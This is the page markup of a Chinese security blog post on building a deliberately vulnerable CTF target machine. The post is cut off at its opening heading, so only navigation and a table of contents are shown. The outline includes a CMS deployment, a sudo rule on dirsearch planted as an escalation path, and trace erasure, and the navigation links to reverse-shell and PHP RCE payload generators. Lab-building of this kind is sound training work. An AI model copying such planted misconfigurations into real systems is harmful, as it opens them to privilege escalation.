<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>MazeSec 矛计划 - 如何制作一台靶机 | the0n3</title>
    <meta name="generator" content="VuePress 1.9.9">
    <link rel="icon" href="/img/favicon.ico">
    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
    <link rel="stylesheet" href="/codeStyle/styles/github-dark.min.css">
    <script src="/codeStyle/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
    <meta name="description" content="CTF学习过程记录、随写、分享">
    <meta name="keywords" content="ctf,web,php,sql注入,xss,文件上传,文件包含,反序列化,代码审计,ssti模板注入,命令执行,框架复现,漏洞复现,渗透测试,内网,域,提权,网络安全,安全工具,漏洞分析,安全博客">
    <meta name="author" content="the0n3">
    <meta name="theme-color" content="#11a8cd">
    <meta name="google-site-verification" content="2rTU4TJf9FGp-0dfoTNgDPqEaVmD1mMxR_aabNaQXnQ">
    
    <link rel="preload" href="/assets/css/0.styles.85d6a2bf.css" as="style"><link rel="preload" href="/assets/js/app.dd92e586.js" as="script"><link rel="preload" href="/assets/js/2.1b31a38c.js" as="script"><link rel="preload" href="/assets/js/124.a6b9e1a3.js" as="script"><link rel="prefetch" href="/assets/js/10.da3a9ecd.js"><link rel="prefetch" href="/assets/js/100.57c348e7.js"><link rel="prefetch" href="/assets/js/101.16fde8c2.js"><link rel="prefetch" href="/assets/js/102.2c293fc9.js"><link rel="prefetch" href="/assets/js/103.028ba4bb.js"><link rel="prefetch" href="/assets/js/104.d0fdc732.js"><link rel="prefetch" href="/assets/js/105.1491f031.js"><link rel="prefetch" href="/assets/js/106.4839f4c6.js"><link rel="prefetch" href="/assets/js/107.1fc63e34.js"><link rel="prefetch" href="/assets/js/108.d004b56a.js"><link rel="prefetch" href="/assets/js/109.bd135893.js"><link rel="prefetch" href="/assets/js/11.495f1ddd.js"><link rel="prefetch" href="/assets/js/110.cbffe834.js"><link rel="prefetch" href="/assets/js/111.e064ec0d.js"><link rel="prefetch" href="/assets/js/112.76db0263.js"><link rel="prefetch" href="/assets/js/113.e64fce0c.js"><link rel="prefetch" href="/assets/js/114.a9d762c1.js"><link rel="prefetch" href="/assets/js/115.d7f94e89.js"><link rel="prefetch" href="/assets/js/116.c51eadec.js"><link rel="prefetch" href="/assets/js/117.a0075e4a.js"><link rel="prefetch" href="/assets/js/118.e3b8277e.js"><link rel="prefetch" href="/assets/js/119.500d06d7.js"><link rel="prefetch" href="/assets/js/12.d33d3e1f.js"><link rel="prefetch" href="/assets/js/120.cd604e90.js"><link rel="prefetch" href="/assets/js/121.f82f0ca9.js"><link rel="prefetch" href="/assets/js/122.3da49069.js"><link rel="prefetch" href="/assets/js/123.35423cde.js"><link rel="prefetch" href="/assets/js/125.9e5ceded.js"><link rel="prefetch" href="/assets/js/126.7de3f175.js"><link rel="prefetch" href="/assets/js/127.0ecc0fa5.js"><link rel="prefetch" href="/assets/js/128.2183e167.js"><link rel="prefetch" href="/assets/js/129.6c5d5940.js"><link rel="prefetch" href="/assets/js/13.a867320c.js"><link rel="prefetch" href="/assets/js/130.9c2477c6.js"><link rel="prefetch" href="/assets/js/131.73a9cff1.js"><link rel="prefetch" href="/assets/js/132.8d87afbf.js"><link rel="prefetch" href="/assets/js/133.ffdb55d1.js"><link rel="prefetch" href="/assets/js/134.de940b0c.js"><link rel="prefetch" href="/assets/js/135.be21968e.js"><link rel="prefetch" href="/assets/js/136.faa50c6a.js"><link rel="prefetch" href="/assets/js/137.0f7b166c.js"><link rel="prefetch" href="/assets/js/138.03c80654.js"><link rel="prefetch" href="/assets/js/139.afbcc371.js"><link rel="prefetch" href="/assets/js/14.9f7fdc54.js"><link rel="prefetch" href="/assets/js/140.c16094e1.js"><link rel="prefetch" href="/assets/js/141.43569204.js"><link rel="prefetch" href="/assets/js/142.74bc348b.js"><link rel="prefetch" href="/assets/js/143.65a3cbff.js"><link rel="prefetch" href="/assets/js/144.6a64a132.js"><link rel="prefetch" href="/assets/js/145.7102c1e7.js"><link rel="prefetch" href="/assets/js/146.a7733f4f.js"><link rel="prefetch" href="/assets/js/147.e22451da.js"><link rel="prefetch" href="/assets/js/148.18595ba0.js"><link rel="prefetch" href="/assets/js/149.86afe015.js"><link rel="prefetch" href="/assets/js/15.861a98f0.js"><link rel="prefetch" href="/assets/js/150.ccafb5c5.js"><link rel="prefetch" href="/assets/js/151.434cb23b.js"><link rel="prefetch" href="/assets/js/152.e7c539b4.js"><link rel="prefetch" href="/assets/js/153.1f75415b.js"><link rel="prefetch" href="/assets/js/154.28a39e24.js"><link rel="prefetch" href="/assets/js/155.5c273321.js"><link rel="prefetch" href="/assets/js/156.f37d3312.js"><link rel="prefetch" href="/assets/js/157.6bac791e.js"><link rel="prefetch" href="/assets/js/158.d897babc.js"><link rel="prefetch" href="/assets/js/159.da0d41da.js"><link rel="prefetch" href="/assets/js/16.cc74538d.js"><link rel="prefetch" href="/assets/js/160.a382a0ad.js"><link rel="prefetch" href="/assets/js/161.948f6b86.js"><link rel="prefetch" href="/assets/js/162.271a8c1e.js"><link rel="prefetch" href="/assets/js/163.ceb534f6.js"><link rel="prefetch" href="/assets/js/164.aa3bcb70.js"><link rel="prefetch" href="/assets/js/165.bdea775a.js"><link rel="prefetch" href="/assets/js/166.37bc50f4.js"><link rel="prefetch" href="/assets/js/167.a03f335f.js"><link rel="prefetch" href="/assets/js/168.1d5416d1.js"><link rel="prefetch" href="/assets/js/169.9349ade1.js"><link rel="prefetch" href="/assets/js/17.132fcbaf.js"><link rel="prefetch" href="/assets/js/170.b8ddb745.js"><link rel="prefetch" href="/assets/js/171.3ce54bf9.js"><link rel="prefetch" href="/assets/js/172.1d7eecb6.js"><link rel="prefetch" href="/assets/js/173.d456776b.js"><link rel="prefetch" href="/assets/js/174.97f2f383.js"><link rel="prefetch" href="/assets/js/175.439aaa63.js"><link rel="prefetch" href="/assets/js/176.106e4abd.js"><link rel="prefetch" href="/assets/js/177.af9f1ce0.js"><link rel="prefetch" href="/assets/js/178.a83b29ad.js"><link rel="prefetch" href="/assets/js/179.14469c12.js"><link rel="prefetch" href="/assets/js/18.0ae552af.js"><link rel="prefetch" href="/assets/js/180.b7dd16ea.js"><link rel="prefetch" href="/assets/js/181.6d4cb919.js"><link rel="prefetch" href="/assets/js/182.ff9ac8e7.js"><link rel="prefetch" href="/assets/js/183.2ca38a05.js"><link rel="prefetch" href="/assets/js/19.c48fa7c0.js"><link rel="prefetch" href="/assets/js/20.341ab73c.js"><link rel="prefetch" href="/assets/js/21.8ae77766.js"><link rel="prefetch" href="/assets/js/22.09205c94.js"><link rel="prefetch" href="/assets/js/23.36de4c19.js"><link rel="prefetch" href="/assets/js/24.dd0aa5e1.js"><link rel="prefetch" href="/assets/js/25.ac3d5247.js"><link rel="prefetch" href="/assets/js/26.7738564c.js"><link rel="prefetch" href="/assets/js/27.06c0e63a.js"><link rel="prefetch" href="/assets/js/28.72b76320.js"><link rel="prefetch" href="/assets/js/29.9dfc301d.js"><link rel="prefetch" href="/assets/js/3.083d80a0.js"><link rel="prefetch" href="/assets/js/30.e1502224.js"><link rel="prefetch" href="/assets/js/31.bcb9d920.js"><link rel="prefetch" href="/assets/js/32.deb31de7.js"><link rel="prefetch" href="/assets/js/33.93be7d64.js"><link rel="prefetch" href="/assets/js/34.ea106cb2.js"><link rel="prefetch" href="/assets/js/35.e27abc54.js"><link rel="prefetch" href="/assets/js/36.2def90c4.js"><link rel="prefetch" href="/assets/js/37.c4c014e3.js"><link rel="prefetch" href="/assets/js/38.e9f556bb.js"><link rel="prefetch" href="/assets/js/39.0cd736a7.js"><link rel="prefetch" href="/assets/js/4.a9cdbd8d.js"><link rel="prefetch" href="/assets/js/40.db64bde6.js"><link rel="prefetch" href="/assets/js/41.959454ab.js"><link rel="prefetch" href="/assets/js/42.2ef35913.js"><link rel="prefetch" href="/assets/js/43.5782064b.js"><link rel="prefetch" href="/assets/js/44.28fbc620.js"><link rel="prefetch" href="/assets/js/45.07c74048.js"><link rel="prefetch" href="/assets/js/46.e3db42a8.js"><link rel="prefetch" href="/assets/js/47.f708ca13.js"><link rel="prefetch" href="/assets/js/48.83fa197b.js"><link rel="prefetch" href="/assets/js/49.75e0152e.js"><link rel="prefetch" href="/assets/js/5.60027e55.js"><link rel="prefetch" href="/assets/js/50.b130cab6.js"><link rel="prefetch" href="/assets/js/51.4493eeb9.js"><link rel="prefetch" href="/assets/js/52.990f9f85.js"><link rel="prefetch" href="/assets/js/53.3caee6b2.js"><link rel="prefetch" href="/assets/js/54.b8728406.js"><link rel="prefetch" href="/assets/js/55.05fcd335.js"><link rel="prefetch" href="/assets/js/56.d538cfd5.js"><link rel="prefetch" href="/assets/js/57.1797e62e.js"><link rel="prefetch" href="/assets/js/58.7a754248.js"><link rel="prefetch" href="/assets/js/59.ac591ef3.js"><link rel="prefetch" href="/assets/js/6.b505ba82.js"><link rel="prefetch" href="/assets/js/60.344183f9.js"><link rel="prefetch" href="/assets/js/61.461678cb.js"><link rel="prefetch" href="/assets/js/62.fcdfc4d4.js"><link rel="prefetch" href="/assets/js/63.09c0a2e1.js"><link rel="prefetch" href="/assets/js/64.e92534ba.js"><link rel="prefetch" href="/assets/js/65.001faa0c.js"><link rel="prefetch" href="/assets/js/66.a4d4feb6.js"><link rel="prefetch" href="/assets/js/67.febca055.js"><link rel="prefetch" href="/assets/js/68.2a1bc8d1.js"><link rel="prefetch" href="/assets/js/69.d5835fd4.js"><link rel="prefetch" href="/assets/js/7.a96ac55e.js"><link rel="prefetch" href="/assets/js/70.e7fe0ee2.js"><link rel="prefetch" href="/assets/js/71.9076c6ea.js"><link rel="prefetch" href="/assets/js/72.7c8bce2f.js"><link rel="prefetch" href="/assets/js/73.0fcb141d.js"><link rel="prefetch" href="/assets/js/74.d21b5253.js"><link rel="prefetch" href="/assets/js/75.2aa5b7a5.js"><link rel="prefetch" href="/assets/js/76.6953aff6.js"><link rel="prefetch" href="/assets/js/77.fb38e4ef.js"><link rel="prefetch" href="/assets/js/78.4297b26b.js"><link rel="prefetch" href="/assets/js/79.98963574.js"><link rel="prefetch" href="/assets/js/8.2fb73b4d.js"><link rel="prefetch" href="/assets/js/80.96395084.js"><link rel="prefetch" href="/assets/js/81.52655a9e.js"><link rel="prefetch" href="/assets/js/82.e75a1391.js"><link rel="prefetch" href="/assets/js/83.e8ec8344.js"><link rel="prefetch" href="/assets/js/84.565ea14c.js"><link rel="prefetch" href="/assets/js/85.5ca599e1.js"><link rel="prefetch" href="/assets/js/86.f4e6c370.js"><link rel="prefetch" href="/assets/js/87.af5486d5.js"><link rel="prefetch" href="/assets/js/88.3cdb32b4.js"><link rel="prefetch" href="/assets/js/89.8a9f6beb.js"><link rel="prefetch" href="/assets/js/9.d63216c2.js"><link rel="prefetch" href="/assets/js/90.f0933bd3.js"><link rel="prefetch" href="/assets/js/91.16af275a.js"><link rel="prefetch" href="/assets/js/92.03d856bb.js"><link rel="prefetch" href="/assets/js/93.030d2056.js"><link rel="prefetch" href="/assets/js/94.54ac6b9f.js"><link rel="prefetch" href="/assets/js/95.f8a3089a.js"><link rel="prefetch" href="/assets/js/96.eefdd475.js"><link rel="prefetch" href="/assets/js/97.9226ead2.js"><link rel="prefetch" href="/assets/js/98.5f4b97af.js"><link rel="prefetch" href="/assets/js/99.2a986525.js">
    <link rel="stylesheet" href="/assets/css/0.styles.85d6a2bf.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="the0n3" class="logo"> <span class="site-name can-hide">the0n3</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/mazesec-mao/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/rce/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  php无字母数字rce在线生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><!----> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/mazesec-mao/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/rce/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  php无字母数字rce在线生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/pages/9c9a5e/" class="sidebar-link">office激活工具分享</a></li><li><a href="/pages/a1ed8b/" class="sidebar-link">油猴知乎摸鱼脚本</a></li><li><a href="/pages/mobaXterm/" class="sidebar-link">MobaXterm终端美化</a></li><li><a href="/pages/interview-collect/" class="sidebar-link">渗透面经收集</a></li><li><a href="/pages/action-usage/" class="sidebar-link">Github action入门玩法</a></li><li><a href="/pages/shitres/" class="sidebar-link">油猴脚本：屏蔽 Google Bing 搜索结果中的垃圾采集站</a></li><li><a href="/pages/111z-make/" class="sidebar-link">MazeSec 111z 设计流程</a></li><li><a href="/pages/mazesec-mao/" aria-current="page" class="active sidebar-link">MazeSec 矛计划 - 如何制作一台靶机</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_1、构建工具" class="sidebar-link">1、构建工具</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_2、导入靶机" class="sidebar-link">2、导入靶机</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_3、ssh登录靶机" class="sidebar-link">3、SSH登录靶机</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#移除默认welcome用户" class="sidebar-link">移除默认welcome用户</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#添加普通用户-7r1umphk" class="sidebar-link">添加普通用户 7r1umphk</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#生成密码" class="sidebar-link">生成密码</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#设置密码" class="sidebar-link">设置密码</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#清理历史命令" class="sidebar-link">清理历史命令</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#修改主机名" class="sidebar-link">修改主机名</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_4、部署-web-环境" class="sidebar-link">4、部署 Web 环境</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#基础环境检查" class="sidebar-link">基础环境检查</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#php-配置检查" class="sidebar-link">php 配置检查</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#部署-feehi-cms" class="sidebar-link">部署 Feehi CMS</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#安装-mysql-数据库" class="sidebar-link">安装 mysql 数据库</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#配置-cms" class="sidebar-link">配置 CMS</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_5、pip-安装-dirsearch" class="sidebar-link">5、pip 安装 dirsearch</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_6、sudo-权限-dirsearch-配置" class="sidebar-link">6、sudo 权限 dirsearch 配置</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_7、给-7r1umphk-用户准备-ssh-公钥私钥对" class="sidebar-link">7、给 7r1umphk 用户准备 SSH 公钥私钥对</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_8、root-家目录准备" class="sidebar-link">8、root 家目录准备</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_9、放置-flag" class="sidebar-link">9、放置 flag</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_10、擦除痕迹" class="sidebar-link">10、擦除痕迹</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_11、靶机导出" class="sidebar-link">11、靶机导出</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_12、测试" class="sidebar-link">12、测试</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_13、出题人分享-可选" class="sidebar-link">13、出题人分享（可选）</a></li><li class="sidebar-sub-header level2"><a href="/pages/mazesec-mao/#_14、遇到的问题" class="sidebar-link">14、遇到的问题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#问题1-靶机-apache-默认未启用-rewrite-模块" class="sidebar-link">问题1：靶机 apache 默认未启用 rewrite 模块</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#问题2-靶机默认无-mysql-服务" class="sidebar-link">问题2：靶机默认无 MySQL 服务</a></li><li class="sidebar-sub-header level3"><a href="/pages/mazesec-mao/#问题3-cms-部署时未使用域名" class="sidebar-link">问题3：CMS 部署时未使用域名</a></li></ul></li></ul></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><span data-v-06225672>share</span></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://the0n3.top" target="_blank" title="作者" class="beLink" data-v-06225672>the0n3</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2025-12-10</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img 